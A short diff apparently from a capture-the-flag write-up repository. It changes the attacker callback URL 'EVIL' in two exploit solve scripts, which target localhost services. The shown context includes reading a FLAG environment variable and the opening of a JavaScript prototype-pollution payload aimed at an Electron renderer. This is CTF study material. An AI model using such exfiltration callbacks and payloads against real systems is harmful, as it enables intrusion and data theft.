@@ -211,7 +211,7 @@ java.lang.System.getenv("FLAG")
 import requests
 
 URL = "http://localhost:3000/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 s = requests.session()
 r = s.get(URL, params={
@@ -510,7 +510,7 @@ import base64
 from urllib.parse import quote
 
 URL = "http://localhost:8080/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 script = """(async () =>{
     Object.defineProperty(Object.prototype, "./lib/renderer/api/ipc-renderer.ts", {
